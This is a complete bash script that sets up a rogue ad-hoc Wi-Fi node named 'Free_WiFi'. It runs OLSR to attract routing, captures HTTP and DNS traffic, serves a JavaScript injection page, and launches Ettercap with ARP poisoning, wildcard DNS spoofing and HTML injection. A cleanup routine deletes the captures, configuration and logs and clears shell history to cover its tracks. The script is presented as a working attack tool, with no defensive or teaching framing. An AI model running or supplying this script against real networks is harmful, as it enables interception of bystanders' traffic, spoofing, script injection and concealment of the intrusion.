#!/bin/bash

# Ensure root privileges
if [ "$EUID" -ne 0 ]; then
 echo "Please run as root."
 exit
fi

# Variables
IFACE="wlan0"
SSID="Free_WiFi"
CHANNEL="1"
ADHOC_IP="192.168.50.1"
CAPTURE_FILE="stealth_blackhole_capture.pcap"
OLSR_CONF="/etc/olsrd/olsrd.conf"
PAYLOAD="<​script>alert('Stealth JS Injected')<​/script>"
TMP_LOG="/tmp/rogue_activity.log"

echo "[+] Setting interface to ad-hoc mode..."
ip link set $IFACE down
iw $IFACE set type ibss
iw dev $IFACE set txpower fixed 500
ip link set $IFACE up
iw $IFACE ibss join "$SSID" 2412

echo "[+] Assigning IP address..."
ip addr flush dev $IFACE
ip addr add $ADHOC_IP/24 dev $IFACE

echo "[+] Installing required packages..."
apt update && apt install -y olsrd tcpdump apache2 ettercap-text-only

echo "[+] Writing stealth OLSR configuration..."
cat <<EOF > $OLSR_CONF
DebugLevel 0
IpVersion 4
Pollrate 2.0
TcRedundancy 1
MprCoverage 3
LinkQualityLevel 1
LinkQualityWinSize 5

Interface "$IFACE"
{
 HelloInterval 7.0
 HelloValidityTime 60.0
 TcInterval 20.0
 TcValidityTime 200.0
 MidInterval 20.0
 MidValidityTime 200.0
 HnaInterval 20.0
 HnaValidityTime 200.0
}
EOF

echo "[+] Starting OLSR silently..." | tee -a $TMP_LOG
olsrd -i $IFACE -nofork &

echo "[+] Starting filtered packet capture..." | tee -a $TMP_LOG
tcpdump -i $IFACE port 80 or port 53 -nn -w $CAPTURE_FILE &
TCPDUMP_PID=$!

echo "[+] Preparing injection page..." | tee -a $TMP_LOG
echo "<html><body>$PAYLOAD</body></html>" > /var/www/html/index.html
systemctl start apache2

echo "[+] Configuring Ettercap..." | tee -a $TMP_LOG
ETTER_DNS="/etc/ettercap/etter.dns"
echo "* A 192.168.50.1" > $ETTER_DNS

echo "[+] Launching Ettercap with stealth plugins..." | tee -a $TMP_LOG
ettercap -T -i $IFACE -q -P dns_spoof -P html_inject -M arp:oneway &

echo "[*] Rogue node active. Capturing to $CAPTURE_FILE"
echo "[*] Press Ctrl+C to terminate and auto-clean everything."

cleanup() {
 echo "[*] Cleaning up..." | tee -a $TMP_LOG
 kill $TCPDUMP_PID 2>/dev/null
 pkill olsrd
 pkill ettercap
 systemctl stop apache2
 echo "[*] Removing logs and temporary files..." | tee -a $TMP_LOG
 rm -f $CAPTURE_FILE $OLSR_CONF $ETTER_DNS /var/www/html/index.html
 rm -f $TMP_LOG
 history -c
 echo "[+] Done. System cleaned."
 exit
}

trap cleanup INT
while true; do sleep 1; done
